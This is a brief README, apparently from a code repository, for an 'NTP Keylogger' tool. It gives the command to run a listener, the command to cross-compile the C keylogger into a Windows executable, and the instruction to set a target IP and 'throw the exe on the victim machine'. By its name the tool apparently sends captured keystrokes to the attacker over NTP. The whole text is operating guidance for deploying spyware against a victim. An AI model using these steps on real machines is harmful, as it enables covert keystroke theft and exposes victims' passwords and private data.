# NTP Keylogger   
## Listener
```
rlwrap python ntpserver.py
```

## Victim
Change the IP to your desired target server IP adress 
```
x86_64-w64-mingw32-gcc jlogger.c -o jlogger.exe -lwsock32 -w
```
Then throw the exe on the victim machine

This is how exe works:


![image](https://user-images.githubusercontent.com/45479002/209933030-92b10432-1884-40a9-9e4d-70584b4d3d91.png)

![jlogger](https://user-images.githubusercontent.com/45479002/209933048-ab41d906-ce19-4ecc-b0ce-1a270578874b.png)
